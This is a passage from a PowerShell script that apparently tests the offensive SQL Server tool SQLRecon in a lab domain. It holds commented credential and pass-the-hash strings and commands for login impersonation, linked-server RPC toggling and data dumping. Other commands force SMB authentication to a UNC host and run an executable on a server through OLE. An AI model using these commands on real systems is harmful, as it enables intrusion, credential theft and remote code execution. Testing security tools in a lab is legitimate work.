...
#$authentication = "WinDomain /domain:kawalabs /username:user /password:Password123"
#$authentication = "WinDomain /domain:kawalabs /username:admin /password:Password123"
#$authentication = "Pth /domain:kawalabs /username:user /hash:58a478135a93ac3bf058a5ea0e8fdb71"
#$authentication = "Local /username:sa /password:Password123"
#$authentication = "EntraID /domain:x.onmicrosoft.com /username:user /password:Password123"
...
Write-Output ""
Execute "$sqlreconPath /a:$authentication /i:invaliduser /h:$server2 /l:$server3 /m:checkrpc"
Execute "$sqlreconPath /a:$authentication /i:invaliduser /h:$server2 /m:checkrpc"
Execute "$sqlreconPath /a:$authentication /i:invaliduser /h:$server2 /m:impersonate"
Write-Output ""
...
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:columns /db:AdventureWorks /table:Product"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:query /database:AdventureWorks /c:'SELECT TOP (5) *  FROM SalesLT.Product'"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:rows /db:AdventureWorks /table:SalesLT.Product"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:search /db:AdventureWorks /keyword:Product"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server3 /m:smb /unc:\\172.16.40.110\test"
...
Write-Output ""
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:disablerpc /rhost:$server1"
...
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:enablerpc /rhost:$server1"
...
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:olecmd /c:'c:\temp\mb-impersonate-2.exe'"
